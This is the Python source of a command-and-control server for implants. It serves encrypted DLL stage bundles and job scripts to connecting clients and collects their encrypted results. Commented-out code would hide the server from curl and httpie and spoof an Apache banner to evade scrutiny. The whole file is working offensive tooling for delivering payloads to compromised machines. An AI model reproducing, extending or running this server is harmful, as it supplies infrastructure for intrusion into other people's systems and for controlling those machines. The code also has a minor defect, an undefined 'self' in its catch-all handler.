"""
usage: server.py [-h] [-d] <bindip> <port> [--password PASSWORD]

arguments:
  bindip    port to bind to
  port      port to bind to

options:
  -h, --help   show this screen
  -d, --debug  show debug output
  -p, --password PASSWORD  stage and job zip file password [default: kukulkan]
"""

import ssl
import asyncio
import logging
import os
import sys
import datetime
from docopt import docopt
from zipfile import ZipFile, ZIP_DEFLATED
from secrets import token_bytes
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes, padding
from cryptography.hazmat.primitives.asymmetric import rsa
from quart import Quart, Blueprint, request, jsonify, Response
from quart.logging import default_handler, serving_handler

AES_IV = token_bytes(16)


def encrypt_file(infile, aes_key, outfile):
    sha256 = hashes.Hash(hashes.SHA256(), backend=default_backend())
    sha256.update(aes_key.encode())
    derived_key = sha256.finalize()

    logging.debug(f"SHA256_KEY: {derived_key.hex()}")

    aes = Cipher(algorithms.AES(derived_key), modes.CBC(AES_IV), backend=default_backend())
    encryptor = aes.encryptor()

    padder = padding.PKCS7(128).padder()
    with open(infile, 'rb') as file_to_encrypt:
        with open(outfile, 'wb') as encrypted_file:
            padded_data = padder.update(file_to_encrypt.read()) + padder.finalize()
            encrypted_file.write(encryptor.update(padded_data) + encryptor.finalize())


def decrypt(encrypted_data, aes_key):
    sha256 = hashes.Hash(hashes.SHA256(), backend=default_backend())
    sha256.update(aes_key.encode())
    derived_key = sha256.finalize()

    aes = Cipher(algorithms.AES(derived_key), modes.CBC(AES_IV), backend=default_backend())
    decryptor = aes.decryptor()
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

    unpadder = padding.PKCS7(128).unpadder()
    return unpadder.update(decrypted_data) + unpadder.finalize()


async def unknown_path(path):
    self.app.logger.error(f"Unknown path: {path}")
    return jsonify({}), 404


async def check_if_naughty():
    try:
        headers = request.headers['User-Agent'].lower()
        if 'curl' in headers or 'httpie' in headers:
            return jsonify({}), 404
    except KeyError:
        pass


async def make_normal(response):
    #response.headers["server"] = "Apache/2.4.35"
    return response


async def job_result():
    data = await request.data
    decrypted_result = decrypt(data, args['--password'])
    logging.info(decrypted_result.decode().strip('\r\n'))
    return '', 200


async def job():
    logging.info('Compressing and encrypting job')
    with ZipFile('./data/job.zip', 'w', compression=ZIP_DEFLATED, compresslevel=9) as zip_file:
        zip_file.write('./jobs/main.py', arcname='./main.py')

    encrypt_file('./data/job.zip', args['--password'], './data/job.blob')

    logging.info(f"Sending job ({os.path.getsize('./data/job.blob')} bytes) ->  {request.remote_addr} ...")
    with open('./data/job.blob', 'rb') as job_zip:
        return Response(job_zip.read(), content_type='application/octet-stream')


async def stage():
    logging.info(f"Sending stage ({os.path.getsize('./data/stage.blob')} bytes) ->  {request.remote_addr} ...")
    with open('./data/stage.blob', 'rb') as stage_zip:
        return Response(stage_zip.read(), content_type='application/octet-stream')

if __name__ == "__main__":

    args = docopt(__doc__)

    logging.basicConfig(
        format="%(asctime)s %(process)d %(threadName)s - [%(levelname)s] %(filename)s: %(funcName)s - %(message)s",
        level=logging.DEBUG if args['--debug'] else logging.INFO
    )

    logging.debug(args)

    # https://cryptography.io/en/latest/x509/tutorial/#creating-a-self-signed-certificate
    if not os.path.exists('./data/cert.pem') or not os.path.exists('./data/key.pem'):
        logging.info('Creating self-signed certificate')
        key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=4096,
            backend=default_backend()
        )

        with open("./data/key.pem", "wb") as f:
            f.write(key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption(),
                    ))

        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, u"US"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, u"CA"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, u"San Francisco"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"My Company"),
            x509.NameAttribute(NameOID.COMMON_NAME, u"mysite.com"),
        ])

        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.datetime.utcnow()
        ).not_valid_after(
            # Our certificate will be valid for 9999 days
            datetime.datetime.utcnow() + datetime.timedelta(days=9999)
        ).add_extension(
            x509.SubjectAlternativeName([x509.DNSName(u"localhost")]),
            critical=False,
        # Sign our certificate with our private key
        ).sign(key, hashes.SHA256(), default_backend())

        with open("./data/cert.pem", "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))

        logging.info('Self-signed certificate written to ./data/key.pem and ./data/cert.pem')

    '''
    ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ssl_context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_COMPRESSION
    ssl_context.set_ciphers('ECHDE+AESGCM:ECDH+AES')
    ssl_context.load_cert_chain(certfile='./data/cert.pem', keyfile='./data/key.pem')
    ssl_context.set_alpn_protocols(['http/1.1', 'h2'])  # accept http1 and http2 connections
    '''

    #loop = asyncio.get_event_loop()

    http_blueprint = Blueprint(__name__, 'http')
    #http_blueprint.before_request(check_if_naughty)
    #http_blueprint.after_request(make_normal)

    http_blueprint.add_url_rule('/stage.zip', 'stage', stage, methods=['GET'])
    http_blueprint.add_url_rule('/job.zip', 'job', job, methods=['GET'])
    http_blueprint.add_url_rule('/job', 'job_result', job_result, methods=['POST'])

    # Add a catch all route
    http_blueprint.add_url_rule('/', 'unknown_path', unknown_path, defaults={'path': ''})
    http_blueprint.add_url_rule('/<path:path>', 'unknown_path', unknown_path, methods=['GET', 'POST'])

    app = Quart(__name__)

    for logger in ['quart.app', 'quart.serving']:
        logging.getLogger(logger).setLevel(logging.DEBUG if args['--debug'] else logging.ERROR)

    logging.info('Creating encrypted stage')
    logging.warning(f"key: {args['--password']} IV: {AES_IV.hex()}")

    with ZipFile('./data/stage.zip', 'w', compression=ZIP_DEFLATED, compresslevel=9) as zip_file:
        for f in [f for f in os.listdir('./data/') if f.endswith('.dll')]:
            zip_file.write(os.path.join('./data', f), arcname=f'./{f}')

    encrypt_file('./data/stage.zip', args['--password'], './data/stage.blob')

    app.register_blueprint(http_blueprint)
    app.run(
        host=args['<bindip>'],
        port=args['<port>'],
        debug=False,
        certfile='./data/cert.pem',
        keyfile='./data/key.pem',
        #ssl=ssl_context,
        use_reloader=False,
        access_log_format='%(h)s %(p)s - - %(t)s statusline: "%(r)s" statuscode: %(s)s responselen: %(b)s protocol: %(H)s'
    )
